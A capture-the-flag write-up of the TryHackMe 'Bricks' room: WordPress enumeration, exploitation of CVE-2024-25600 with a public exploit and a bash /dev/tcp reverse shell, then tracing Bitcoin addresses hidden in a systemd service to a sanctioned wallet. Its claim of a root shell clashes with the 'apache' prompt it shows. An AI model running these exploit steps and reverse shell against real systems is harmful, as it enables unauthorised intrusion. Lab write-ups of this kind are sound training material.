###TryHackMe - Bricks

*Write-up by Bosota-the-Boron
Overview

This room involves enumerating a Linux webserver running a vulnerable WordPress installation using the Bricks theme.
The objective is to perform enumeration, exploit a known RCE vulnerability, escalate privileges, and investigate suspicious system services leading to OSINT-based findings.

## Table of Contents
- [Overview](#overview)
- [1. Initial Enumeration](#1-initial-enumeration)
- [2. WordPress Enumeration](#2-wordpress-enumeration)
- [3. Exploiting CVE-2024-25600](#3-exploiting-cve-2024-25600)
- [4. Flag Capture](#4-flag-capture)
- [5. Post-Exploitation](#5-post-exploitation)
- [6. Decoding the Payload](#6-decoding-the-payload)
- [7. OSINT Investigation](#7-osint-investigation)
- [Conclusion](#conclusion)

#1. Initial Enumeration
Nmap Scan

Command executed:
nmap -sC -sV -sS -Pn -p- -T4 10.80.180.100

Relevant results:
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp    open  http    WebSockify Python/3.8.10
443/tcp   open  https   Apache httpd, WordPress
3306/tcp  open  mysql   MySQL (unauthorized)

Observations:

Port 443 hosts WordPress 6.5.
/robots.txt discloses /wp-admin/.
Theme assets indicate the Bricks theme is installed.

#2. WordPress Enumeration
WPScan was used to enumerate the target (I have definate Targer IP on my /etc/hosts)

wpscan --url https://bricks.thm --disable-tls-checks


Key findings:

WordPress version: 6.5 (insecure)
Theme detected: Bricks 1.9.5
XML-RPC enabled
No visible plugins
The critical discovery is that Bricks version 1.9.5 is vulnerable to:

CVE-2024-25600
Unauthenticated Remote Code Execution (RCE)

Exploit reference:
https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT

#3. Exploiting CVE-2024-25600

Requirements:
python3.8 -m pip install rich --upgrade
pip install prompt_toolkit
pip install alive-progress

Launch the exploit:
python3 CVE-2024-25600.py -u http://bricks.thm

Start a reverse shell listener:
nc -nlvp 4444

Insert the reverse shell payload inside the exploit:
bash -c 'exec bash -i &>/dev/tcp/<YOUR-IP>/4444 <&1'

After triggering the exploit, a shell is obtained as root.


#4. Flag Capture

Listing the directory:
ls -la

Suspect file discovered:
650c844110baced87e1606453b93f22a.txt

Content first Flag:
THM{fl46_650c844110baced87e1606453b93f22a}

#5. Post-Exploitation: Suspicious Services

Attempting to use htop failed, so systemd services were enumerated:
systemctl list-units --type=service --state=running

Result :
  apache@ip-10-80-144-162:/data/www/default$ systemctl list-units --type=service --state=running
  <systemctl list-units --type=service --state=running
    UNIT                                           LOAD   ACTIVE SUB     DESCRIPTION                                                     
    accounts-daemon.service                        loaded active running Accounts Service                                                
    acpid.service                                  loaded active running ACPI event daemon                                               
    atd.service                                    loaded active running Deferred execution scheduler                                    
    avahi-daemon.service                           loaded active running Avahi mDNS/DNS-SD Stack                                         
    badr.service                                   loaded active running Badr Service                                                    
    cron.service                                   loaded active running Regular background program processing daemon                    
    cups-browsed.service                           loaded active running Make remote CUPS printers available locally                     
    cups.service                                   loaded active running CUPS Scheduler                                                  
    dbus.service                                   loaded active running D-Bus System Message Bus                                        
    getty@tty1.service                             loaded active running Getty on tty1                                                   
    httpd.service                                  loaded active running LSB: starts Apache Web Server                                   
    irqbalance.service                             loaded active running irqbalance daemon                                               
    kerneloops.service                             loaded active running Tool to automatically collect and submit kernel crash signatures
    lightdm.service                                loaded active running Light Display Manager                                           
    ModemManager.service                           loaded active running Modem Manager                                                   
    multipathd.service                             loaded active running Device-Mapper Multipath Device Controller                       
    mysqld.service                                 loaded active running LSB: start and stop MySQL                                       
    networkd-dispatcher.service                    loaded active running Dispatcher daemon for systemd-networkd                          
    NetworkManager.service                         loaded active running Network Manager                                                 
    polkit.service                                 loaded active running Authorization Manager                                           
    rsyslog.service                                loaded active running System Logging Service                                          
    rtkit-daemon.service                           loaded active running RealtimeKit Scheduling Policy Service                           
    serial-getty@ttyS0.service                     loaded active running Serial Getty on ttyS0                                           
    snap.amazon-ssm-agent.amazon-ssm-agent.service loaded active running Service for snap application amazon-ssm-agent.amazon-ssm-agent  
    snapd.service                                  loaded active running Snap Daemon                                                     
    ssh.service                                    loaded active running OpenBSD Secure Shell server                                     
    switcheroo-control.service                     loaded active running Switcheroo Control Proxy service                                
    systemd-journald.service                       loaded active running Journal Service                                                 
    systemd-logind.service                         loaded active running Login Service                                                   
    systemd-networkd.service                       loaded active running Network Service                                                 
    systemd-resolved.service                       loaded active running Network Name Resolution                                         
    systemd-timesyncd.service                      loaded active running Network Time Synchronization                                    
    systemd-udevd.service                          loaded active running udev Kernel Device Manager                                      
    ubuntu.service                                 loaded active running TRYHACK3M                                                       
    udisks2.service                                loaded active running Disk Manager                                                    
    unattended-upgrades.service                    loaded active running Unattended Upgrades Shutdown                                    
    upower.service                                 loaded active running Daemon for power management                                     
    user@1000.service                              loaded active running User Manager for UID 1000                                       
    user@114.service                               loaded active running User Manager for UID 114                                        
    whoopsie.service                               loaded active running crash report submission daemon                                  
    wpa_supplicant.service                         loaded active running WPA supplicant                                                  
  
  LOAD   = Reflects whether the unit definition was properly loaded.
  ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
  SUB    = The low-level unit activation state, values depend on unit type.


Among the normal services, one stood out:
ubuntu.service  TRYHACK3M

Inspecting it:
systemctl cat ubuntu.service

It referenced a binary located at:
/lib/NetworkManager/nm-init.dialog

Listing the directory:
ls /lib/NetworkManager

A configuration file appeared: inet.conf
Viewing it:
cat /lib/NetworkManager/inet.conf

It contained a long hexadecimal string:
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d

#6. Decoding the Payload

Using CyberChef (From Hex → Raw), the decoded output revealed two Bitcoin Bech32 addresses:
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa

Bech32 / SegWit addresses are commonly used for lightweight deposits, including Taproot addresses.

#7. OSINT Investigation

Checking the addresses with Blockchain.com Explorer:
Example:
https://www.blockchain.com/explorer/addresses/btc/bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa

Opening the first transaction revealed a sending wallet:
bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r

Searching this wallet online led to OpenSanctions:
https://www.opensanctions.org/entities/ofac-4d99af7cc172df2b9fbb833cb5af39dbbc011a2c/
This connected the wallet to an OFAC-sanctioned entity, suggesting the malicious systemd service is simulating or referencing real-world illicit crypto activity.

This room demonstrated:

    Full reconnaissance and enumeration of a WordPress-based target.
    Successful exploitation of CVE-2024-25600 (Bricks RCE).
    Privilege escalation to root via web RCE.
    Identification of a malicious systemd service.
    OSINT tracing of cryptocurrency addresses linked to sanctioned entities.

The combination of exploitation and real-world OSINT data provides a practical and realistic investigation workflow.


